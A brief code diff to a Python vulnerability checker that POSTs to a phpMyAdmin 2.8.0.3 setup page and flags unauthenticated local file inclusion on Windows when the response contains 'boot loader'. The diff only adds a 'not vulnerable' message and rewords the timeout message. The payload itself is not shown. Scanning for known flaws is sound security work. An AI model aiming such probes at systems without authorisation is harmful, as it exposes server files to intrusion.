@@ -30,9 +30,11 @@ class phpmyadmin_setup_lfi_BaseVerify:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"boot loader" in req.text:
                 cprint("[+]存在PhpMyAdmin2.8.0.3无需登录任意文件包含导致代码执行漏洞(WINDOWS)...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+            else:
+                cprint("[-]不存在phpmyadmin_setup_lfi漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
